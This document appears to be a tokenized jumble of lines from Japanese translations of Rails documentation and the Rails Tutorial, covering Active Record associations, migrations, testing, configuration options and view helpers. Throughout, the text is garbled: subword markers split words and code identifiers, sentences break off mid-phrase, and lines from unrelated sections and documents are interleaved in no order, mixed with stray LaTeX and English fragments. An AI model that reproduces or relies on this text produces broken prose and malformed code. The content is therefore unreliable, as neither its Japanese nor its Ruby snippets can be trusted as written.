▁この 章で 扱 っている 手法 は 本書 全体 の中で 最も 難 易 度 が 高い ので 、 理解 を 助 け るため 、 コードを書く 前に は い った ん 立 ち 止 ま って イン ター フ ェ ー ス を 探 検 する ことにします 。
▁render ▁action : ▁: edit
▁これ を使って 、 慣習 的に 正しく Active ▁Record の \ emph { 関連付け } を実装 していきます ▁(\ ref { sec : user _ micropost _ associations }) ▁ が 、 まずは \ k ode { Micropost } モデル 単 体 を ▁( テスト駆動開発 で ) ▁ 動く ように してみます 。
▁ いよいよ CRUD の D まで 到 達 しました ▟ ここでは 記事 を データベースから 削除します 。
▁その おかげで 、` except ` メソッドは たとえば with _ indifferent _ access など で 期待どおり に 動作します 。
▁ 新しい Web サーバ を追加する ために 、\ href { https :// dev center ▖ heroku ▖ com / articles / rails - Puma } { Heroku 内の Puma ドキュメント } ▁( 英語 ) ▁ に したがって セットアップ していきます 。
▁ Cloud ▁IDE や Unix 系 の OS ▁( M a x ▁OS ▁X など ) ▁ を使っている 場合は 、 次のように \ k ode { curl } コマンドで 簡単に 取得 できます
▁ 使用される パーシャル 名 は 、 コレクション の中に ある 「 モデル名 」 を参照 して 決定 されます ▟ この場合 の モデル名 は ` Product ` です 。
▁* ▁` config ▖ active _ support ▖ escape _ html _ ent it ies _ in _ json ` は 、 JSON シリアライズ に含まれる HTML エ ン テ ィ テ ィ を エスケープ する かどうかを指定します 。
▁GR O U P ▁BY ▁status
▁( 上のコード では 、 条件 部分 に \ k ode { user ▖ id } の代わりに Rails の 習慣 である \ k ode { user } を使用している ことに注意してください ▟ Rails は このような 場合に 自動的に \ k ode { id } を使用します 。
▁この チェック は ` require ▁' rails / test _ help ' ` の 際に 自動的に 行われ る ようになりました ▟ この 呼び出し を削除し なくても 悪 影 響 が 生じる ことはありません 。
▁ 日時 に対して 期間 を 加 減 算 できます 。
▁{0} 図 7 ▖ 1 {/0} {1} この節 で 作成する ユーザープロファイル のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ mockup _ profile _ name _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁< th > T ext </ th >
▁ サンプルアプリケーションの 今後 の開発 では 、 その さらに 簡潔 な スタイル を 可能な 限り 使用する ことにします 。
▁\ emph { 失敗する } テストを 最初に 書き 、 テストにパス する コードを 次に 実装 することで 、 しか る べ き 振る舞い が テスト によって 正しく 検証 されている 、 という 自 信 が 付き ます 。
▁* ▁[ re S R C が 選 ぶ 無料 の プログラミング 学習 用 書 籍 一覧 ▁( 英語 ) ]( http :// re s r c ▖ io / list / 10 / list - of - free - programming - books / # ruby )
▁これ については 本ガイド で 後 述 します 。
▁ 前 者 の 疑問符 を使用した 文法 も 便利です が 、\ emph { 同じ } 変数 を 複数の 場所に 挿 入 したい場合は 、 後者の 置き換え 後 の 文法 を使用する のが より 便利です 。
▁| ▁ ミドルウェア ▁| ▁ 役 割 ▁|
▁ セキュア な パスワード の実装 は 、\ k ode { has _ secure _ password } という Rails の メソッドを呼び出す だけで ほとんど 終 わ ってしまいます ▟ このメソッドは 、 User モデル で 次のように 呼 び 出 せ ます 。
▁{0} 図 12 ▖ 23 : {/0} ▁{1} Home ページ で 動作する ステータスフィード {/1}
▁また \ ref { sec : a _ hashed _ password } で 説明したように 、\ k ode { has _ secure _ password } を User モデルに 追加 した ことで 、 そのオブジェクト 内で \ k ode { authenticate } メソッドが 使える ようになっています 。
▁ レシーバ が ` con ve r t _ key ` に応答する 場合 、 このメソッドは すべての 引数 に対して 呼び出され ます 。
▁create ▁app / views / microposts
▁### ▁Ruby のバージョン
▁# ▁=> ▁ { : a => 0, ▁: b =>1 , ▁: c =>2}
▁ 執 筆 時点 では 、 デフォルトで ない フォーマット として サポート されている のは `: db ` のみ です 。
▁ このため 、 上 を コンソール で 実行する と \ k ode { NoMethodError } 例外が発生します 。
▁* ▁ 引数に ▁( 英語 の ) ▁ 活用 ルール を 適用 します ( inflect ion ) 。
▁ただし 、 ログイン の場合 ▁( リスト \ ref { code : log _ in _ success } と リスト \ ref { code : login _ upon _ signup }) ▁ と異なり 、 ログアウト 処理 は 1 か 所 で 行える ので 、\ k ode { destroy } アクションに 直接 ログアウト 処理 を書く ことにします 。
▁< target ▁option =" fast " ▁name =" compile " ▁/>
▁第 \ ref { cha : sign _ up } 章では 、 ユーザーが サイトに ユーザー登録 できるように し 、 ユーザープロファイル のための ページ を作成します 。
▁ すべての マイクロポスト を表示する ページ
▁ ローカル コンピュータ で Rails サーバー を実行する 。
▁Rails はデフォルトで は すべての カラム を取り出し ます 。
▁( 実際には 少し 余 裕 を 持 た せ て 78 列 に して あります ) ▁ 。
▁Article ▖ many ?
▁ フォーム を追加する には 、` app / views / blorgh / articles / show ▖ html ▖ erb ` の ` render ▁@ article ▖ comments ` 呼び出し の 直後 に 以下の行 を追加します 。
▁ マニフェストファイル には ▁ _ ディレクティブ ▁( directive : ▁ 命 令 、 指示 ) _ ▁ を含め ます ▟ ディレクティブ を使用して 必要な ファイルを 指定 し 、 それ に基いて 最終的に 単 一 の CSS や JavaScript ファイルが ビルド されます 。
▁` Hash ▖ deep _ dup ` メソッドは 、 自分自身 の 複 製 に 加えて ▁その 中の すべての キー と 値を 再帰的 に 複 製 します ▟ 複 製 には Active ▁Support の ` Object # deep _ dup ` メソッド を使用しています 。
▁ alert ▁" page ▁has ▁loaded !"
▁ 継 承 階層 を {0}{1} 図 4 ▖ 1 {/1}{/0} に示します 。
▁* ▁` config ▖ action _ view ▖ erb _ tr im _ m ode ` は 、 ERB で使用する ト リ ム モード を指定します 。
▁ アプリケーションの 開発 時に のみ 必要となる gem のインストール を指定する には 、 以下の よう に記述 します 。
▁上の 関連付け に対応する マイグレーション は以下のような感じ になります 。
▁* ▁` updated _ at ` ▁- ▁ レコード が更新され たときに 現在の 日付 時刻 が自動的に 設定 されます
▁しかし この 式 の動作 では \ text tt { ||= } 記 法 の動作 と同じ に な らず 、 説明 上 不 都 合 なので 、 上の 解説 では \ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} ▁( | | が 右 辺 にある 点に注意 ) ▁という 式 を 用 いて 説明しました 。
▁#### ▁ お す す め の 方法
▁ 好 み に応じて 、 ドキュメント ルート からの 相 対 フルパス や URL を指定することもできます 。
▁ 最後の 図 \ ref { fig : user _ profile _ microposts } では 、 最初の ユーザーの \ emph { 2 番目 } の ページ と 、 下 部 にある ページネーション のリンク を表示し ています 。
▁| ▁| ▁4 10 ▁| ▁: g one ▁|
▁1 クリック で 削除 できる 記事 の 一覧 が あるとします 。
▁Active ▁Record では 、 データベースから オブジェクトを 取り出す ための 検索 メソッドを 多数 用 意 しています 。
▁belongs _ to ▁: comment
▁If ▁you
▁{0} 図 10 ▖5{/0}{1} マイクロポスト 用の コードの ある ユーザープロファイルページ ▁( ただし マイクロポスト がない ) ▟\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ no _ microposts _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ Follow / Unfollow ボタン をテストする 。
▁しかし 、 執 筆 当 時の 最新 バージョン である 3▖0 ▖ 4 まで の RedCloth は XSS に 関 しても 脆 弱 でした 。
▁self を省略した 結果を リスト \ ref { code : bootstrap _ config } に示します 。
▁ 能動的関係 も 受動的関係 も 、 最終的に は データベースの 同じ テーブル を使う ことになります ▟ したがって 、 テーブル名 には この 「 関係 」 を表す 「\ emph { relationship }」 を使い ましょう ▟ モデル名 も同様に して 、 Relationship モデル とします 。
▁ 関連付け は 、 通常 双 方 向 で 設定 します ▟ 2 つの モデル 両方 に 関連 を定義する 必要があります 。
▁### ▁ スキーマ の 更新
▁ ルート ▁( root ) ▁ への ルーティング のための マッピング を追加する 。
▁$ ▁git ▁re base ▁master
▁この 編集 ページ 上で ユーザー に関する 情報を 変更 し 、[ Update ▁User ] ▁ ボタン を 押 せ ば 、 To y アプリケーション 内の ユーザー情報 が変更され ます ▁({0}{1} 図 2▖ 8 {/1}{/0} ) 。
▁#### ▁select _ datetime
▁Action ▁Mailer は ` Abstract Controller ` を継承し ているので 、 Action ▁Controller と同様に 一般的な ヘルパーメソッド を使用できます 。
▁</ script >
▁Rails のデフォルトの ` has _ many ` 関連付け は 、 ほとんどの場合 カスタマイズ 不要 ですが 、 時に は 関連付けの 動作を カスタマイズしたくなること も ある と思います 。
▁invoke ▁test _ unit
▁ フォロワー の 通知
▁{0} 図 7 ▖8{/0}{1} ユーザー表示ページ に カスタム の Gravatar を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ custom _ gravatar _ bootstrap _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁change
▁#### ▁content _ for
▁ この動作 は リテラル コンストラクタ と 同等です が 、 動作 の内容 が 明 確 に 示 されています 。
▁ これはリスト \ ref { code : will _ paginate _ test } で使用されていました 。
▁ユーザー登録 手 続 き の最後 には 、 作成された ユーザーの 新しい プロファイル を表示できるように するために 、 ユーザーを \ emph { 表示する } ための ページ を作成し 、 ユーザー用の REST アーキテクチャ を実装する 第 一 歩 を 踏 み 出 します ▁(\ ref { sec : mvc _ in _ action }) 。
▁第 一 に 、 Rails アプリケーションに 何らかの 機能 を追加する ときには 、 ぜ ひ \ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts ア ー カ イ ブ } を チェック してみてください ▟ 今 自分 が や ろ う と している ことは 、 既に Ryan ▁Bates が 取り上げ た トピック にある かもしれません
▁ 最終的な \ k ode { correct \_ user } の実装
▁ここで の 目標は 、 Home ページ 、 Help ページ 、 About ページ をそれぞれ 編集 し 、 最終的に ページ ごとに 異なる タイトル を表示する ことです 。
▁test : mysql
▁ただし ` underscore ` は 引数 を 取り ません 。
▁この ファイルは 、( ` lib / blorgh / engine ▖ rb ` に置かれている ) ▁` blorgh / engine ▖ rb ` ファイルを require し 、` Blorgh ` という 基本 モジュール を定義します 。
▁ 関連付けの メソッドは 、 すべて キャッシュ を 中 心 に 構 築 されています ▟ 最後に 実行 した クエリ の 結果は キャッシュ に 保 持 され 、 次 回 以降 の 操作 で 使用できます 。
▁JavaScript の 最小化 プロセス は もう少し 複 雑 です 。
▁def ▁ welcome _ email ( user , ▁ com p any )
▁### ▁` uniqueness `
▁* ▁ 検索 された レコード の ソ ート 順 、 取り出し たい 属性 、 グループ 化 の 有 無 など を指定する
▁この gem は 最初に エンジンの ` lib / blorgh ▖ rb ` を require し 、 続いて ` lib / blorgh / engine ▖ rb ` を require します ▟ 後者は この エンジンの 機能を 担 う 主要な 部品 が 定義されている 場所 です 。
▁" you " や " your " を使用する 表現 を 避ける こと 。
▁(\ k ode { picture \_ uploader ▖ rb } という ファイル で \ k ode { Picture Upload er } クラス が 定義 されています ▟\ ref { sec : image _ validation } で 修正 します が 、 今は デフォルトの まま で 大丈夫 です ▟)
▁上のコード を使用することで 、 リスト \ ref { code : password _ reset _ email } の ログ にある リンクを 開 いた ときに パスワード再設定の フォーム が 出力 される ようになります 。
▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / V ac u ous _ t ru th } { 無 意味 な テスト } ではない ことに注意してください ▁(\ k ode { followers } について も同様です ) 。
▁</ section >
▁self を省略した 結果を リスト \ ref { code : initial _ passing _ password _ tests } に示します 。
▁# ▁この ファイル には ActionController :: P ar a m s W r app er 用の 設定 が含まれ ており
▁( 場合によっては 、\ text tt { Ctrl - C } を使用して ローカル の Web サーバーを再起動 する 必要がある かもしれません 。
▁ 「 はじめ に 」 で 約 束 した とおり 、 この Users リソース は すべての Rails プロジェクト に 標準 装 備 されている scaffold ジェネレータ で 生成 します 。
▁> > ▁x ▁ += ▁1
▁ 投 稿 した 画像 を 扱 った り 、 その 画像 を Micropost モデルと 関連付け するために 、 今回は \ href { https :// github ▖ com / carrierwave uploader / carrierwave } { CarrierWave } という 画像 アップ ロー ダ ー を使います 。
▁ ユーザー一覧ページ のモックアップ
▁( - 5 ▖ ▖ 5 )▖ to _ a ▖ split ▁ { ▁| i | ▁i ▖ multiple _ of ?(
▁* ▁` config ▖ action _ view ▖ e mb ed _ authenticity _ token _ in _ remote _ form s ` は 、 フォーム で `: remote ▁=> ▁true ` を使用した 場合 の ` authenticity _ token ` のデフォルトの 動作 を設定します 。
▁( なお 、 リスト \ ref { code : base _ title _ test } では \ emph { インスタンス変数 } ▁(\ ref { sec : mvc _ in _ action } と \ ref { sec : a _ user _ class }) ▁ と \ emph { 文字列 の 式 展開 } ▁(\ ref { sec : string s } を使用しています ) 。
▁リスト \ ref { code : users _ migration } の場合 、\ k ode { change } メソッドは \ k ode { create \_ table } という Rails の メソッドを 呼 び 、 ユーザーを 保存 するための テーブル を データベースに 作成します 。
▁以下の ディレクトリ は 、
▁ユーザーの プロファイル ページに タイトル と 見 出 し を追加する 。
▁image _ path (" edit ▖ png ") ▁# ▁=> ▁ / assets / edit ▖ png
▁ユーザー インデックス への ページネーション 実装 は ついに 完了 しました ▟ でも 私 は 、 ここで ぜ ひ とも ある 1 つの 改良 を 加えて み たい のです ▟ 実は Rails には コンパクト な ビュー を作成するための 素晴らしい ツール がいくつも あります ▟ この節 では それらの ツール を使用して インデックス ページの リファクタリング ▁( 動作を 変 え ずに コードを 整 理 すること ) ▁ を行う ことにします 。
▁c ▖ first _ name ▁== ▁ o ▖ customer ▖ first _ name ▁# ▁=> ▁true
▁ サイト 監 視 用に \ href { http :// s c out app ▖ com /}{ S c out } と \ href { http :// www ▖ new rel ic ▖ com /}{ New ▁Re li c } { p 2 } の 導 入 を 検 討 すること も お勧め いた します 。
▁ チュートリアル 本 編 では この ファイル を修正する ことはありません が 、 { p 0} に {2} ▖ gitignore {/2} ファイル への 追加 例 があります ▟ これは 、\ ref { sec : advance d _ testing _ setup } で 行う オプション の詳細 テスト 設定 の一部 です 。
▁=> ▁" 4 28 17 7 foobar "
▁ まとめ : ▁Rails チーム は 可視性 が public で 内部で のみ 使用する メソッド や クラス には `: no doc : ` を指定します ▟ API の 可視性 の変更は 慎 重 に 行 な わ れる べ き であり 、 pull ▁request での 議 論 を 経 て から 行なう こと 。
▁ 新しい パスワード 再設定 フォーム は リスト \ ref { code : login _ form _ redux } と 多くの 共通 点 があります が 、 重要な 違い として 、\ k ode { form \_ for } の 呼び出し で使用する リソース と URL が 異 な っている こと と 、 パスワード 属性 が 省略 されている ことが 挙 げ られます 。
▁たとえば 、 ▁ ローカル マシン で Ruby ▁ 2▖1 ▖ 4 が インストール でき なく て 何 時間 も 過 ご し てしまい 、 な ん と か 無 事 に インストール できた と 思 った ら 、 先 日 Ruby ▁ 2▖1 ▖ 5 が リリース された ことに 気 付 い たとき など です 。
▁< td > <%= ▁article ▖ text ▁%></ td >
▁この ユーザー オブジェクトを データベースに 実際に 保存 するには 、\ k ode { user } 変数 に対して \ k ode { save } メソッドを 呼 び ます 。
▁ それ に 続いて 、 関連付け に関する さまざまな ヒント や 活用 方法 、 Rails の関連付け メソッドと オプション の 完全な 参 照 物 も ご 紹介します 。
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active ' ▁ AND ▁" users "▖" state " ▁= ▁' finished '
▁Rails 開発 経験 者 にとって は 、 リスト \ ref { code : title _ helper } のコードは スタイルシート を インクルード する の と 大 差 ない 単純な ものです が 、 ここに も Ruby の 重要な 概念 が \ emph { 多数 } 含まれています ▟ モジュール 、 メソッド 定義 、 任意の メソッド 引数 、 コメント 、 ローカル変数 の 割り当て 、 論理値 ▁( boolean ) 、 制御 フ ロー 、 文字列 の 結合 、 そして 戻り値 です 。
▁User モデルの \ k ode { followed _ users } 関連付け を追加する 。
▁Client ▖ find _ by !
▁ 外部キー を使用する場合 には 、 マイグレーション で 明示的に 定義 する必要があります 。
▁# ▁@ @ emulate _ boolean s にアクセス できる クラスメソッド を生成する
▁<%= ▁render ▁partial : ▁" form ", ▁local s : ▁ { zone : ▁@ zone } ▁%>
▁ Permission ▁is ▁here by ▁gra nt ed , ▁free ▁of ▁charg e , ▁to ▁any ▁person
▁has _ one ▁: profile
▁module ▁ Dependencies
▁`: inverse _ of ` オプションは 、 その 関連付けの 逆 関連付け となる ` has _ many ` 関連付け または ` has _ one ` 関連付け の名前 を指定します 。
▁ EXPLAIN の 出力 を 解 釈 することは 、 本ガイド の 範 疇 を 超 えます 。
▁Rails を はじめ よう ╼ == == =========
▁# ▁ ライブラリ
▁Load ing ▁test ▁environment
▁ { p 0} で 推 奨 している Cloud 9 ▁IDE を {2} 利用 しない {/2} 場合は 、 Rails プロジェクト で使用する ための \ k ode { workspace } ディレクトリ を作成 しておいてください ▁( リスト ▁\ ref { code : mkdir _ rails _ projects })▟ ▁directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁doesn ’ t ▁already ▁exist ▁and ▁then ▁change ▁into ▁the ▁directory ▖
▁background - color : ▁red ;
▁In ▁Chapter ▁\ ref { cha : following _ users }, ▁we ’ ll ▁see ▁an ▁example ▁where ▁REST ▁principle s ▁allow ▁us ▁to ▁model ▁a ▁ subtle r ▁problem , ▁“ following ▁users ” , ▁in ▁a ▁natural ▁and ▁convenient ▁way ▖
▁validates ▁: card _ number , ▁presence : ▁true , ▁if : ▁: p a id _ with _ card ?
▁$ ▁bundle ▁exec ▁ guard
▁上の例では 、 アセット 読み込み パス のいずれか にある 画像ファイル ▁( ` app / assets / images / image ▖ png ` など ) ▁ が 指定された と 解 釈 されます 。
▁* ▁ 得 られた 結果を 行 ごとに 同等の Ruby オブジェクト として インスタンス 化 します 。
▁ デフォルトの XML ビルダ は 、` Builder :: X m l M ar k up ` から 直接 生成された インスタンス です 。
▁\ text tt { Gemfile } へ \ k ode { bootstrap - sass } を追加する
▁` ▖ erb ` レイアウト がない場合 、` ▖ builder ` レイアウト があれば それ を使用します 。
▁` render ` で 指定 できる ほとんどの オプション では 、 出力 される コンテンツ は 現在の レイアウト の一部 として ブラウザ 上で 表示されます 。
▁ただし 、 doc rails には プルリクエスト を送信し ないでください ▟ 自分で 書いた 変更 への 意 見 が 欲 しい 場合は 、[ Rails ]( http :// github ▖ com / rails / rails ) の方 で お 願 い します 。
▁この コマンドを実行 するだけで 、 指定 の ディレクトリに Rails アプリケーションの ス ケ ル ト ン を簡単に 作成 できます 。
▁また 、 本書 を 卒 業 して 実際の 開発 に 携 わ る ときの ために 、\ ref { sec : following _ co nclusion } で 役 立 つ リソース 集 ▁( 読み 物 ガイド ) ▁ についても 紹介します 。
▁まずは \ k ode { update } アクション の作成 から 進 め ますが 、 これはリスト \ ref { sec : updating _ user _ objects } にある ように 、\ k ode { update \_ attributes } ▁(\ ref { code : user _ update _ action _ unsuccessful }) ▁ を使って 送信された \ k ode { params } ハッシュ に基いて ユーザーを 更新 します 。
▁message : ▁" % { value } は 有効な 値 ではありません " ▁ }, ▁allow _ nil : ▁true
▁リスト \ ref { code : password _ reset _ form } では 以下の フォーム タグ ヘルパー を使用している 点にご注意ください 。
▁class ▁ Customer ▁< ▁ActiveRecord :: Base
▁`: primary _ key ` オプションで 主キー を明示的に指定 することで これ を上書き することができます 。
▁ この場合は 、\ k ode { post _ via _ redirect } メソッド ▁( リスト \ ref { code : a _ test _ for _ valid _ submission }) ▁ が 統合テスト の 場合にのみ アクセス可能 であること を 利用 し 、 以下のような コード を使用します 。
▁require _ tree の詳細については [ マニフェストファイル と ディレクティブ ](# マニフェストファイル と ディレクティブ ) を参照してください 。
▁リスト \ ref { code : test _ helper _ log _ in } のとき
▁ puts ▁p ▖ name ▁# ▁" S o me ▁ Book "
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁1 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁Users コントローラは 、 ユーザーの 一覧 を \ k ode {@ users } 変数 ▁ (@ は Ruby の インスタンス変数 を表す ) ▁ に保存 し 、\ k ode { index } ビュー に 渡す 。
▁ 本番環境で の 画像アップロード を 調 整 する
▁( 最初の 2 行 の設定 以外 は 必 須 ではありません 。
▁self を省略した 結果を リスト \ ref { code : adding _ the _ about _ page } に示します 。
▁| ▁` D e er ` ▁| ▁` de ers ` ▁|
▁ 重複 の ない 一意 の カテゴリ ー が必要な場合は 、` Category ▖ joins (: article )▖ uniq ` を使用できます 。
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e ", ▁" f ", ▁" g ", ▁" h ", ▁" i ", ▁" j ", ▁" k ", ▁" l ", ▁" m ", ▁" n ", ▁" o ",
▁しかし 、 HTML ドキュメント に 直接 コードを 埋 め 込 む と ( XSS によって これが 生じる ことがあります ) 、 この プロパティ を 読み 書き できてしまいます 。
▁A ar on ▁P at ter s on の ▁[ ha na ]( https :// github ▖ com / t end er lo ve / ha na ) ▁gem が 代 表 的 ですが 、 最新の 仕 様 変更 をすべて サポート している わけではありません 。
▁" Product "▖ deconstantize ▁# ▁=> ▁" "
▁╼╼ ▁\ subsection { 最初の テスト } ▁% ▁( fold )╼ ▁\ label { sec : our _ first _ test }╼╼
▁belongs _ to ▁: assembly
▁ 期待どおり に 動作する ことは 、 Active ▁Support の ` test / core _ ext / date _ ext _ test ▖ rb ` 用の テストスイート で 確 認 できます 。
▁has _ many ▁: orders , ▁class _ name : ▁" Trans action "
▁* ▁Rails ▁4▖0 から ` ActiveSupport :: K e y G en er at or ` が 導 入 され 、 署 名 付き cookies の 生成 と 照 合 など に 使用される ようになりました 。
▁# ▁< name > Jeremy ▁Ke mp er </ name >
▁following / follower をテストする ための リレーションシップ 用 fixture
▁* ▁` new _ photo _ path ` は ` / photos / new ` を返します
▁このメソッドは ` console ` ブロック で使用する のが 最適です 。
▁#### ▁` transform _ value s ` と ` transform _ value s !`
▁` match ` メソッドと `: via ` オプションを使用することで 、 複数の HTTP 動詞 に 同時に マッチする ルーティング を作成 できます 。
▁ リソース フル ルーティング では 大 袈裟 過 ぎ る 場合に 、 アプリケーションを 無 理 に リソースフルな フレームワーク に 押 し 込 め る 必要はありません 。
▁ スパム コメント を 削除 できるように する の も 、 この ブログ では 重要な 機能 です 。
▁class ▁G oodnessValidator ▁< ▁ ActiveModel :: Validator
▁ ╼ / db /* ▖ sqlite 3 ╼ / db /* ▖ sqlite 3- j our n al ╼╼ # ▁I gnore ▁all ▁log file s ▁and ▁te mp file s ▖
▁$("# new _ article ")▖ on (" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁ユーザーの 一覧 、 ページネーション 用 リンク 、 移動 用の ▁[ Users ] ▁ リンク のモックアップ を 図 \ ref { fig : user _ index _ mockup } に示します
▁` add ` メソッドを使用して 、 特定の 属性 に関連する メッセージ を 手動で 追加 できます 。
▁ ハイフン ▁( - ) ▁ が 入 っている ために エラーが発生し てしまいます 。
▁ { enumerate }╼╼\ begin { code listing }╼\ label { code : palindrome _ test er }╼\ code caption { A ▁simple ▁test er ▁for ▁ palindrome s ▖ } ╼ %= ▁ lang : i rb ╼\ begin { code } ╼ > > ▁def ▁ palindrome _ test er ( s )╼ > > ▁if ▁ FILL _ IN ╼ > > ▁ puts ▁" It ' s ▁a ▁ palindrome !" ╼ > > ▁else ╼ > > ▁ puts ▁" It ' s ▁not ▁a ▁ palindrome ▖ " ╼ > > ▁end ╼ > > ▁end ╼\ end { code }╼\ end { code listing }╼╼ ▁\ subsection { title ヘルパー 、 再び } ▁% ▁( fold )╼ ▁\ label { sec : back _ to _ the _ title _ helper }╼╼ We ▁are ▁now ▁in ▁a ▁position ▁to ▁understand ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper }, \ foot note {
▁ //= ▁require _ tree ▁ ▖
▁ 統合テスト では 、 ユーザーが Web ブラウザで アプリケーション と やりとり する 操作を シ ミ ュ レ ート できる ので 特に 強 力 です 。
▁javascript _ tag ▁" alert (' A ll ▁is ▁good ') "
▁ ビューの 役 割 は 、 この 情報を ユーザーが 読 め る 形式で 表示 することです 。
▁* ▁ 必要な 拡張機能 だけ を利用する 方法
▁Micropost モデルの 方 では 、 {0} belongs _ to ▁: user {/0} という コード が必要になる のですが 、 これは ▁リスト { p 1 } の マイグレーション によって自動的に 生成 されている はずです ▁( リスト \ ref { code : micropost _ belongs _ to _ user }) 。
▁ここで 非常に 便利な のが ` and ▁return ` という メソッドです 。
▁\ emph { Rails チュートリアル } を 最 後 まで 読み 終 わ る 頃 には 、 重要な コマンドは 一 通り 使えるように な っている ことでしょう 。
▁この プ リ プロセス 順序 は非常に 重要です ので 、 心 に 留 めて おいてください 。
▁ 表 \ ref { table : static _ pages } の各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ page _ content _ spec })▟ この テストで 使用している \ k ode { assert _ select } メソッドでは 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁\ k ode { bundle ▁install } コマンド の実行 には し ば ら く 時間がかかる かもしれません ▟ 完了 後 、 アプリケーションが 実行 可能 になります 。
▁ これはリスト \ ref { code : new _ edit _ partial } で使用されていました 。
▁association _ foreign _ key : ▁" other _ user _ id "
▁ 安全 な 文字列 とは 、 HTML に そのまま 挿 入 しても 問題 がない という マーク が 付け ら れ ている 文字列 です 。
▁つまり 、 最初の 例 の \ k ode { str } を 別の 変数 名 ▁(\ k ode { the _ function _ argument } など ) ▁ に変更し ても 、 メソッドの 呼び出し 方は 全 く 同じです 。
▁Rails ▁ 2▖1 ▖ 2 より 前 のバージョン ( および Ruby ) に含まれる バグ が原因で 、 ハ ッ カ ー は以下のように 任意の ヘッダ を 注入 できてしまいます 。
▁belongs _ to ▁: customer , ▁ touch : ▁: orders _ updated _ at
▁* ▁` ActiveSupport :: Cache :: Store ▖ logger ` は 、 キャッシュストア 操作 で使用する ロガー を指定します 。
▁``` ruby
▁この節で 定義 する \ k ode { belongs \_ to } / \ k ode { has \_ many } 関連付け を使用することで 、 表 \ ref { table : association _ methods } に 示す ような メソッドを Rails で 使える ようになります 。
▁1 つの relationship テーブル を使って 2 つの モデル ▁( 能動的関係 と 受動的関係 ) ▁ を シ ミ ュ レ ート する方法 については 、\ ref { sec : following } で説明します 。
▁ ログアウト 用 リンク が表示されている ことを確認する
▁ フィクスチャ をテストする ときに \ k ode { digest } メソッドを 既に 作成 して あった ので ▁( リスト \ ref { code : digest _ method }) 、 上の 結 論 に従って 、 新しい トークン を作成するための \ k ode { new \_ token } メソッドを 作成 できます 。
▁self ▖ emulate _ boolean s ▁= ▁true
▁ フォロー 関連の 機能 の実装 はこの とおり 完了 しました が 、 ステータスフィード に 取り か か る 前に もう 一 つだけ 機能を 洗 練 させ て み たい と思います 。
▁これらの 拡張 を 1 つ か 2 つ でも 実装 してみる ことで 、 本書 から 巣 立 って 自分の アプリケーション を書く ときに き っ と 役に立 つ ことでしょう 。
▁\ ref { sec : a _ first _ feed _ implementation } で示した コードの 問題 は 、\ k ode { following \_ id s } で フォローしている \ emph { すべての } ユーザーを メモリ ー から 一 気 に 取り出し 、 フォローしているユーザー の 完全な 配列 を 作り 出 した ことです 。
▁ 基本 タイトル を含め た StaticPages コントローラの テスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁* ▁これらの 同 等 な メソッドが 実行する SQL は 、 従来 の実装 と同じ ではありません 。
▁ ネスティング が 深 くなる ことで ルーティング の 扱 い が 困難 になる 問題 については 、 J a mis ▁B u c k の 有名な ▁[ 記事 ]( http :// web log ▖ ja mis b u c k ▖ org / 200 7 / 2 / 5 / n est ing - resources ) ▁ を参照してください ▟ J a mis は Rails アプリケーション 設計 上の よい 経験 則 を 提 案 しています 。
▁これは \ k ode { change } メソッドで 役に立ちます ▟ このメソッドは オブジェクト と シンボル を引数に取り 、 シンボル を呼び出し た 結果を 計算 して オブジェクト 上の メソッドと します ▟ これは ブロック の 前 と 後 いずれ についても 行われます 。
▁{0} 図 12 ▖2{/0} ▁{1} フォローする 相手 を見つけ る {/1}
▁ umerate }╼╼ ▁% ▁subsection ▁a _ working _ follow _ button _ with _ ajax ▁( end )╼╼ ▁\ subsection { フォロー をテストする } ▁% ▁( fold )╼ ▁\ label { sec : following _ tests }╼╼
▁最初に 、 有効なメールアドレス と 無効な メールアドレス の コレクション に対するテスト を 行い ましょう 。
▁この 段階で テストを実行 してみる と 、 ▁\ passing ▁ になります 。
▁ W IP : ▁この リスト に まだ 含まれていない ヘルパー があります 。
▁ お す す め の ワ ー ク フ ー ロー [ rails - dev - box ]( https :// github ▖ com / rails / rails - dev - box ) で 説明 している ように 、 railties のテスト は 特に 時間 が か か り 、 ソースコード を ` / v a gr an t ` に マウント すると さらに 時間 が か か ります 。
▁* ▁` config ▖ active _ record ▖ dump _ schema _ after _ migration ` は 、 マイグレーション 実行時に スキーマ ダ ン プ ( ` db / schema ▖ rb ` または ` db / structure ▖ sql ` ) を行なう かどうかを指定します 。
▁S ublime ▁Text は \ href { http :// macro m ate s ▖ com } { TextMate } の 影 響 を 強く 受 け ています ▟ 実際 、 ス ニ ペ ッ ト や カ ラ ー ス キー ム などの 設定 は TextMate と 互換性 があります 。
▁* ▁` ar ound _ enqueue `
▁2 番目 に 人 気 の テンプレート として \ href { http :// ha m l - lang ▖ com /}{ H a m l } があり ▁( 注意 : ▁" HA M L " ではありません ) ▁ 、 筆者 は 個 人 的に H a m l の方が 気 に 入 っています ▟ 残念ながら \ emph { 十分 に } 普 及 していない ため 、 初 級 者 向 け チュートリアル の 採 用 は 見 送 りました 。
▁* ▁` config ▖ active _ support ▖ time _ precision ` は 、 JSON エンコード された 時間 値 の 精 度 を指定します 。
▁ユーザーの \ k ode { followed _ users } の配列 を作成する には 、\ k ode { followed _ id } の配列 を取り出し 、 それぞれの id ごとに 対応する ユーザー を見つけ 出 します 。
▁#### ▁` find _ each `
